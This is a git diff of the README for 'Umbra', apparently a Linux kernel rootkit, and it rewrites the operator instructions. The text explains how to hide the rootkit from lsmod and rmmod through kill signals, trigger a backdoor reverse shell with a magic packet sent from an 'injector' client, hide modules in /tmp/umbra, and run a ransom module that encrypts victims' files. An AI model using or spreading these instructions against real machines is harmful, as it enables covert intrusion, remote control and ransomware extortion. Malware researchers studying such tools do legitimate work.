@@ -48,7 +48,7 @@ Also bear in mind that Umbra only incorporates light hiding and protection mecha
 1. [Build and Install](#build-and-install)
 2. [Unloading Umbra](#unloading-umbra)
 3. [Local Control](#basic-usage-local-control)
-4. [Remote Control](#umbra-injector-remote-control)
+4. [Umbra Injector: Remote Control](#umbra-injector-remote-control)
 5. [Umbra Modules](#umbra-modules)
    * [(NEW) Ransom](#ransom-module)
 6. [References](#references)
@@ -112,13 +112,6 @@ kill -51 1
 
 Note: Umbra also tries to start the reverse shell on load.
 
-### Spawn reverse shell via backdoor
-Any host can get a reverse shell by sending a specially-crafted packet to a machine infected with Umbra. The backdoor will try to open the shell on IP:5888, where IP is the IP address of the attacking machine.
-
-The backdoor listens for packets with the following payload:
-`UMBRA_PAYLOAD_GET_REVERSE_SHELL`
-, but I also provide a client which will do the job for you. You can download the client from [latest releases](https://github.com/h3xduck/Umbra/releases/), or you can build your own using my library [RawTCP](https://github.com/h3xduck/RawTCP_Lib).
-
 ### Hide the rootkit - Invisible mode
 This will prevent the rootkit from being shown by commands such as *lsmod*, or being removed via *rmmod*.
 ```
@@ -132,11 +125,15 @@ kill -53 1
 ```
 
 ## Umbra Injector: Remote control
-### Get reverse shell
-The program can be run either before Umbra is installed (thus waiting until it is), or after Umbra is installed on the target system.
+### Get reverse shell via backdoor
+The Umbra Injector can be run either before Umbra is installed (thus getting the shell once it is on), or after Umbra is installed on the target system.
 ```
 ./injector -S 127.0.0.1
 ```
+The backdoor listens for packets with the following payload: 
+`UMBRA_PAYLOAD_GET_REVERSE_SHELL`.
+
+You can also build your own injector using my library [RawTCP](https://github.com/h3xduck/RawTCP_Lib).
 
 ### Hide the rootkit remotely - Invisible mode
 This will prevent the rootkit from being shown by commands such as *lsmod*, or being removed via *rmmod*.
@@ -144,19 +141,21 @@ This will prevent the rootkit from being shown by commands such as *lsmod*, or b
 ./injector -i 127.0.0.1
 ```
 
-### ¡Unhide the rootkit remotely
+### Unhide the rootkit remotely
 This reverts the invisible mode if active.
 ```
-./client -u 127.0.0.1
+./injector -u 127.0.0.1
 ```
 
 ### Help
-You can see the full information on how to run the client by:
+You can see the full information on how to run the Umbra Injector by:
 ```
 ./injector -h
 ```
 
 ## Umbra Modules
+The Umbra Modules will be stored by the *install.sh* script on /tmp/umbra, where Umbra will hide them. The directory will not visible by commands such as *ls* or similar.
+
 ### Ransom module
 This module can launch remote ransomware-like attacks via the Umbra Injector. Encrypted files appear with the *.ubr* extension.
 
